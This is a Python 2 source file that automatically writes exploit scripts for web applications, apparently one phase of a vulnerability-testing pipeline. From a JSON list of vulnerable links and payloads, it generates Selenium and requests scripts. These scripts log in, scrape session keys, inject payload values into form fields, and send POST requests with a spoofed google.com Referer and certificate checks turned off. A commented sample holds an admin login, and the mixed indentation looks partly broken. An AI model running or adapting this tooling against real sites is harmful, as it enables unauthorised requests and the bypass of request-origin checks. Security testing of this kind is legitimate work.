import json, os
from bs4 import BeautifulSoup
import requests
import copy
import time
from pprint import pprint
import urllib2
from urlparse import urlparse
from urlparse import parse_qs
from selenium import webdriver
#from seleniumrequests import Firefox

#Following are optional required
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import Select
from selenium.common.exceptions import NoSuchElementException

#for purpose of easy to update packages in generated scripts when a new package is added
packagesPayload = {"packages":{"json","os","requests","copy","time","urllib2"},"modules":{"bs4":"BeautifulSoup","pprint":"pprint","selenium":"webdriver", "selenium.webdriver.common.by":"By","selenium.webdriver.support.ui":"Select","selenium.common.exceptions":"NoSuchElementException","urlparse":"urlparse,parse_qs"}}

#method to automate function
def automateexploit():
        #Input Phase3 Json file 
	with open("input.json") as inp:
		inputjson = json.load(inp)
        with open("phase3JSON.JSON") as f:
        	phase3json = json.load(f)

        #Get All links that can be exploited in Phase 3
        allLinks = phase3json.keys()
        #print allLinks

	#If automation is to be specified
	showautomation = False
	#showautomation = True
      	
	#Starting file index for filename generation
	fileindex = 1
	
	#Appname
	appname = inputjson.get('appname')

	#Login Required
	login_flag = False
	if inputjson.get('login') == "True":
		login_flag = True
	#Form login payload

	#loginPayload = {'url':'https://app2.com/login/index.php','username': 'admin', 'password': 'AdminAdmin1!','loginbtn': None}
		loginPayload = {'url':''}
		loginPayload['url'] = inputjson.get('login_page')
		loginPayload[inputjson.get('form_username_name')] = inputjson.get('form_username_value')	
		loginPayload[inputjson.get('form_password_name')] = inputjson.get('form_password_value')	
		if inputjson.get('form_login_button_name') is not None:
			loginPayload['form_login_button_name'] = inputjson.get('form_login_button_name')	
		if inputjson.get('form_login_button_id') is not None:
			loginPayload['form_login_button_id'] = inputjson.get('form_login_button_id')	
        
	#Handling Application session key
	appsesskey = False
	appsesskeyPayload = None
	
	if inputjson.get('dynamic_param') == "True":	
		appsesskey = True
		appsesskeyPayload = {'temp':''}
		appsesskeyPayload[inputjson.get('label')] = 'randomvalue'
		appsesskeylabel = inputjson.get('label')
		appsesskeyPayload.pop('temp')

	#For each payload in json, generate the exploit script
        for eachLink in allLinks:
		allpayload = phase3json.get(eachLink)
                #print eachLink
		#print allpayload
               	#each key is the pageurl to be attacked
		pageurl = eachLink
                
        	if login_flag:
			loginurl = loginPayload.get('url')		

		#constructing exploit filename
		exploitfilename = appname + "_exploit" + str(fileindex) + ".py"
		
		#increase exploit file index
		fileindex = fileindex + 1
	
		#print exploit file name
		print "exploitfilename is " + exploitfilename
		
		for payload in allpayload:
		#open exploit file for writing
			with open(exploitfilename,'w') as file:
			
				#Write required libraries in exploit script
				writelibraries(file)			
			
				if payload.get('Referer') is not None:
					writereferrerattack(payload,pageurl,file)
				else:	
					#write webdriver creation
					file.write("\n\n")
					file.write("mydriver = webdriver.Firefox()\n")
	
					#Construct webdriver login
					if login_flag:
						writewebdriverlogin(loginPayload,file)	
	
					#For handling App Session key
					if appsesskey:
						writeappsesskeyattack(appsesskeyPayload,appsesskeylabel,file)
					file.write("\n\n")
					#if payload.get('type') == 'get':				
					#	writegetattack(appsesskeyPayload, payload, pageurl, file)
						#print payload
						#print pageurl
						#print payload.get('type')
					if payload.get('type') == 'get':
						writegetattack(appsesskeyPayload, payload, pageurl, file)
					elif payload.get('type') == 'post':				
						writepostattack(appsesskeyPayload, payload, pageurl, exploitfilename, file)
		
				#Close file
				file.write("\n\n")
				file.write("##END OF FILE##\n")
				file.close()
				break
		
			if showautomation:
	        		#Driver for login page
	        		mydriver = webdriver.Firefox()
	        		mydriver.get(loginurl)
	
				mydriver.find_element_by_id('username').send_keys(loginPayload['username'])
				mydriver.find_element_by_id('password').send_keys(loginPayload['password'])
	
				#Click Register button
				mydriver.find_element_by_id('loginbtn').click()
				flag = True
	
				# For handling applications with session key	
				if appsesskey:
					#mydriver.get(appsesskeyPayload.get('url'))
					pgsrc = mydriver.page_source
					appsesskeyPayload['url'] = mydriver.current_url
					#lopgsrc.get('sesskey')
	
	    				soup = BeautifulSoup(pgsrc)
	    				allA = soup.find_all('a')
	    				for indA in allA:
	        				if indA.get('href') is not None:
	            					valA = indA.get('href').split('?')
	            					if valA[0] in appsesskeyPayload.get('url'):
	                					sessKsplit = valA[1].split('=')
	                					sessK = sessKsplit[1]
	                					break
					
					for skeyword in appsesskeyPayload:
						if skeyword != 'url':
							payload[skeyword] = appsesskeyPayload.get(skeyword)
							appsesskeyPayload[skeyword] = sessK
							payload[skeyword] = sessK	
	
				if payload.get('type') == 'post':
					flag_post = True
	              			payload.pop('type',None)
					mydriver.get(pageurl)
					elements = mydriver.find_elements_by_tag_name('input')
					for keyword in payload:	
						print "keyword : " + keyword
						if payload.get(keyword):
							print "value : " + payload.get(keyword)
					 	
						#value = mydriver.execute_script('return arguments.value;', elements)
						#print("Before update, hidden input value = {}".format(value))
						for element in elements:
							if element.get_attribute('name') == keyword:
								#Check element's initial target attribute
								print "value before :" + element.get_attribute('value')
								#Execute javascript to change the attribute
								script = "return arguments[0].value = '" + payload.get(keyword) + "'"
								mydriver.execute_script(script, element) 
								#Check that the target attribute has changed
								print "value after :" + element.get_attribute('value')
						#temp_string = "//input[@name]='" + keyword + "']"
						#mydriver.execute_script("document.getElementById('input')")
						#mydriver.find_element_by_xpath(temp_string)
						#mydriver.execute_script("document.getElementById('input').value="+payload.get(keyword))
						#payload.get(keyword))
					print "**********************"
					for element in elements:
						if element.get_attribute('name') == 'submitbutton':
							mydriver.find_element_by_id(element.get_attribute('id')).click()
							flag = False
							mydriver.quit()
							break	
					#if flag:
					#	mydriver.get(pageurl)
					#	for keyword in payload:
		                        #       	if flag2 :
					#			if payload.get(keyword):
		                        #               		finalurl = pageurl + "?" + keyword + "=" + payload.get(keyword)
		                        #      			flag2 = False
					#		else:        
					#			if payload.get(keyword):
					#				finalurl = finalurl + "&" + keyword + "=" + payload.get(keyword)
					#		print finalurl
					#		mydriver.get(finalurl) 
					#		mydriver.maximize_window()
					#		mydriver.quit()
		               	elif payload.get('type') == 'get':
		              		payload.pop('type',None)
					for keyword in payload:
		                                if flag :
							if payload.get(keyword):
		                                        	finalurl = pageurl + "?" + keyword + "=" + payload.get(keyword)
		                                		flag = False
						else:        
							if payload.get(keyword):
								finalurl = finalurl + "&" + keyword + "=" + payload.get(keyword)
					print finalurl
					mydriver.get(finalurl) 
					mydriver.maximize_window()
					mydriver.quit()

def writelibraries(exploitfile):
	exploitfile.write('#Importing Required Packages\n\n')
	allpackages = packagesPayload.keys()
	for each in allpackages:
		payload = packagesPayload.get(each)
		if each == "packages":
			for keyword in payload:
				exploitfile.write("import " + keyword + '\n')
		if each == "modules":
			for keyword in payload:
				exploitfile.write("from " + keyword + " import " + payload.get(keyword) + '\n')

def writewebdriverlogin(loginpayload, exploitfile):
	payload = loginpayload
	#print "payload is " + str(payload)
	exploitfile.write("mydriver.get(\"" + str(payload.get('url')) + "\")\n")	
	#payload.pop('url', None)
	for keyword in payload:
		if keyword != 'form_login_button_name' and keyword != 'form_login_button_id' and keyword != 'url':
			exploitfile.write("mydriver.find_element_by_id('" + keyword + "').send_keys('" + payload.get(keyword) +"')" + '\n')
	
	for keyword in payload:
		if keyword != 'url':
			if keyword == 'form_login_button_id' and payload.get(keyword) is not None:
				#print "keyword is " + keyword + ":" + payload.get(keyword)
				exploitfile.write("mydriver.find_element_by_id('" + payload.get(keyword) + "').click()" + '\n')
			elif keyword == 'form_login_button_name' and payload.get(keyword) is not None:
				#print "keyword is " + keyword + ":" + payload.get(keyword)
				exploitfile.write("mydriver.find_element_by_id('" + payload.get(keyword) + "').click()" + '\n')

def writeappsesskeyattack(appsesskeyPayload, appsesskeylabel, exploitfile):
	exploitfile.write("#Application SessionKey fetch\n")
	exploitfile.write("appsesskeyPayload = " + str(appsesskeyPayload) + "\n\n")
	exploitfile.write("appsesskeyPayload['url'] = mydriver.current_url\n")
	exploitfile.write("session_keyword = '" + appsesskeylabel + "'\n")
	exploitfile.write("sessK = ''\n")
	exploitfile.write("mydriver.get(appsesskeyPayload.get('url'))\n")
	exploitfile.write("pgsrc = mydriver.page_source\n")
	exploitfile.write("soup = BeautifulSoup(pgsrc)\n")
    	exploitfile.write("allA = soup.find_all('a')\n")
    	exploitfile.write("for indA in allA:\n")
        exploitfile.write("\tif indA.get('href') is not None:\n")
        exploitfile.write("\t\tif session_keyword in indA.get('href'):\n")
        exploitfile.write("\t\t\tu = indA.get('href')\n")
	exploitfile.write("\t\t\to = urlparse(u)\n")
	exploitfile.write("\t\t\tparamdict = parse_qs(o.query)\n")
	exploitfile.write("\t\t\tsessK = paramdict[session_keyword][0]\n")
	exploitfile.write("\t\t\tbreak\n")
	#exploitfile.write("\t\t\tsessKsplit` = valA[1].split('=')\n")
        #exploitfile.write("\t\t\tsessK = sessKsplit[1]\n")
				
	exploitfile.write("for skeyword in appsesskeyPayload:\n")
	exploitfile.write("\tif skeyword != 'url':\n")
	exploitfile.write("\t\tsession_keyvalue = sessK\n")	

def writegetattack(appsesskeyPayload, payload, pageurl, exploitfile):
	payload.pop('type',None)
	flag = True
	for keyword in payload:
		flag2 = True
		if appsesskeyPayload is not None:
			for keyword2 in appsesskeyPayload:
				if keyword == keyword2:
					flag2 = False
		if flag2:
			if flag:
				if payload.get(keyword):
	                		finalurl = pageurl + "?" + keyword + "=" + payload.get(keyword)
	                        	flag = False
			else:        
				if payload.get(keyword):
					finalurl = finalurl + "&" + keyword + "=" + payload.get(keyword)
	
	exploitfile.write("tempurl = \"" + finalurl + "\"\n")
	if appsesskeyPayload is not None:
		exploitfile.write("finalurl = tempurl + \"&\" + session_keyword + \"=\" + session_keyvalue\n") 
		exploitfile.write("print \"finalurl is \" + finalurl\n")
		exploitfile.write("mydriver.get(finalurl)\n")
	else:
		exploitfile.write("mydriver.get(tempurl)\n")
	#mydriver.get(finalurl) 
	#mydriver.maximize_window()
	exploitfile.write("mydriver.quit()\n")

def writepostattack(appsesskeyPayload, payload, pageurl, exploitfilename, exploitfile):
	flag_post = True
	payload.pop('type',None)
	exploitfile.write("pageurl = \"" + pageurl + "\"\n")
	exploitfile.write("mydriver.get(pageurl)\n")
	exploitfile.write("elements = mydriver.find_elements_by_tag_name('input')\n")
	exploitfile.write("payload = " + str(payload) + "\n\n")
	if appsesskeyPayload is not None:
		exploitfile.write("payload[session_keyword] = session_keyvalue\n\n") 
	exploitfile.write("flag_successful = False\n")
	exploitfile.write("first_flag = True\n")
	#exploitfile.write("for keyword in payload:\n")
	#exploitfile.write("\tif payload.get(keyword) is None:\n")
	#exploitfile.write("\t\tpayload.pop(keyword,None)\n")

	#exploitfile1.close()
		
	#with open(exploitfilename,'a') as exploitfile:
	exploitfile.write("for keyword in payload:\n")
	exploitfile.write("\tif payload.get(keyword):\n")
	exploitfile.write("\t\tfor element in elements:\n")
	exploitfile.write("\t\t\tif element.get_attribute('name') == keyword:\n")
	exploitfile.write("\t\t\t\tflag_successful = True\n")
	exploitfile.write("\t\t\t\tscript = \"return arguments[0].value = '\" + payload.get(keyword) + \"'\"\n")
	exploitfile.write("\t\t\t\tmydriver.execute_script(script, element)\n\n")
	exploitfile.write("if flag_successful:\n")
	exploitfile.write("\tflag_successful = False\n")
	exploitfile.write("else:\n")
	exploitfile.write("\tfor keyword in payload :\n")
        exploitfile.write("\t\tif first_flag :\n")
        exploitfile.write("\t\t\tif payload.get(keyword) :\n")
        exploitfile.write("\t\t\t\tfinalurl = pageurl + \"?\" + keyword + \"=\" + payload.get(keyword)\n")
        exploitfile.write("\t\t\t\tfirst_flag = False\n")
        exploitfile.write("\t\telse:\n")
        exploitfile.write("\t\t\tif payload.get(keyword):\n")
        exploitfile.write("\t\t\t\tfinalurl = finalurl + \"&\" + keyword + \"=\" + payload.get(keyword)\n")
	exploitfile.write("if first_flag is False:\n")
	exploitfile.write("\tmydriver.get(finalurl)\n")
	exploitfile.write("\tprint finalurl\n")
	#exploitfile.write("mydriver.implicitly_wait(10)\n")

	#exploitfile.write("for element in elements:\n")
	#exploitfile.write("\tif element.get_attribute('name') == 'submitbutton':\n")
	#exploitfile.write("\t\tmydriver.find_element_by_id(element.get_attribute('id')).click()\n")
	#exploitfile.write("\t\tbreak\n")
	exploitfile.write("elementbtn = None\n")
	exploitfile.write("try:\n")
	exploitfile.write("\telementbtn = mydriver.find_element_by_xpath(\"//input[starts-with(@type,'submit')]\")\n")
        exploitfile.write("\telementbtn.submit()\n")
	exploitfile.write("except:\n")
        exploitfile.write("\ttry:\n")
	exploitfile.write("\t\telementbtn = mydriver.find_element_by_xpath(\"//input[starts-with(@type,'button')]\")\n")
        exploitfile.write("\t\telementbtn.submit()\n")
       	exploitfile.write("\texcept:\n")
        exploitfile.write("\t\tpass\n")
	exploitfile.write("mydriver.quit()\n")

def writereferrerattack(payload, pageurl, exploitfile):
	exploitfile.write("\n\n")
	exploitfile.write("with open(\"input.json\")as fs:\n")
	exploitfile.write("\tinputjson = json.load(fs)\n")
	exploitfile.write("dynamic_param = inputjson.get(\"dynamic_param\")\n")
	exploitfile.write("label = inputjson.get(\"label\")\n")
	exploitfile.write("sessK = \"\"\n")
	exploitfile.write("origin = inputjson.get(\"origin\") #please provide the \"/\" (forward slash) at the end\n")
	exploitfile.write("login_page = inputjson.get(\"login_page\")\n")
	exploitfile.write("#form parameters\n")
	exploitfile.write("form_username_name = inputjson.get(\"form_username_name\")\n")
	exploitfile.write("form_username_value = inputjson.get(\"form_username_value\")\n")
	exploitfile.write("form_password_name = inputjson.get(\"form_password_name\")\n")
	exploitfile.write("form_password_value = inputjson.get(\"form_password_value\")\n")
	exploitfile.write("login = inputjson.get(\"login\") #False - if login not needed (for app10.com - login not required)\n")
	
	exploitfile.write("with requests.Session() as s:\n")
	exploitfile.write("\tprint login\n")
	exploitfile.write("\tif login is True:\n")
	exploitfile.write("\t\tprint \"here\"\n")
	exploitfile.write("\t\tformPayload = {form_username_name: form_username_value, form_password_name: form_password_value}\n")
	exploitfile.write("\t\tp = s.post(login_page, data=formPayload, verify=False)\n")
	exploitfile.write("\t\tif dynamic_param is True:\n")
	exploitfile.write("\t\t\tsoup = BeautifulSoup(p.text)\n")
	exploitfile.write("\t\t\tallA = soup.find_all('a')\n")
	exploitfile.write("\t\t\tfor indA in allA:\n")
	exploitfile.write("\t\t\t\tif indA.get('href') is not None:\n")
	exploitfile.write("\t\t\t\t\tif label in indA.get('href'):\n")
	exploitfile.write("\t\t\t\t\t\tu = indA.get('href')\n")
	exploitfile.write("\t\t\t\t\t\to = urlparse(u)\n")
	exploitfile.write("\t\t\t\t\t\tparamdict = parse_qs(o.query)\n")
	exploitfile.write("\t\t\t\t\t\tsessK = paramdict[label][0]\n")
	exploitfile.write("\t\t\t\t\t\tbreak\n")
	
	exploitfile.write("\tpayload = {")
	flag2 = True
	for keyword in payload:
		if flag2:
			flag2 = False
			if payload.get(keyword) is not None:
				exploitfile.write("\"" + keyword + "\": \"" + payload.get(keyword) + "\"")
			else:
				exploitfile.write("\"" + keyword + "\": \"\"")
		else:
			if payload.get(keyword) is not None:
				exploitfile.write(",\"" + keyword + "\": \"" + payload.get(keyword) + "\"")
			else:
				exploitfile.write(",\"" + keyword + "\": \"\"")

	exploitfile.write("}\n")
	exploitfile.write("\ts.headers.update({\"Referer\":\"https://www.google.com\"})\n")
	exploitfile.write("\tr = s.post('" + pageurl + "', data=payload, verify=False, allow_redirects=True)\n")
	exploitfile.write("\tprint r.text\n")
	exploitfile.write("\tprint r.url\n")
	exploitfile.write("\tmydriver = webdriver.Firefox()\n")
	exploitfile.write("\tmydriver.get(r.url)\n")
	exploitfile.write("\tmydriver.quit()\n")

	

automateexploit()

